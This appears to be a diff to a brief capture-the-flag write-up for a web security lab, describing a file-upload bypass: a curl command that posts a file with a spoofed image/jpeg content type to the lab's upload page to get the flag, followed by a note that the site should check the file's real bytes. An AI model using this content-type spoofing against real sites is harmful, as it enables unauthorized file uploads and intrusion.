@@ -1,2 +1,6 @@
+On this page: http://DARKLY_IP/?page=upload
+
 We sent a request with a dummy file and sent it as image/jpeg. We then got the flag.
 curl -s -H "Content-Type:multipart/form-data" -F Upload=Upload -F "uploaded=@xd.png;type=image/jpeg" 'http://10.12.248.13/?page=upload'
+
+For this one, the site should check if the file is actually what it expects, from the bytes for example.
